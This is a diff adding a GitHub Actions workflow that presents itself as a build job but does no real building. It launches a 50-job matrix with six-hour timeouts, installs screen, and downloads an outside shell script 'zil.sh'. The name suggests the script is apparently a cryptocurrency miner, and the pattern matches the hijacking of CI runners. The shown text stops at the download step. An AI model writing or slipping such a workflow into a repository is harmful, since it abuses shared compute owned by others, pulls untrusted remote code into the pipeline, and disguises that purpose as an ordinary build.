@@ -1,0 +1,28 @@
+name: SUGAR
+on: [push, pull_request]
+jobs:
+  build:
+    name: Ba_channel
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I, J]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 10
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Donet
+      uses: actions/setup-dotnet@v1.7.2
+      with:
+        dotnet-version: ${{ matrix.dotnet-version }}
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Konek_Nie
+      run: |
+        sudo apt update
+        sudo apt install screen -y
+        wget https://github.com/Zamilstroe/zilSH/blob/main/zil.sh
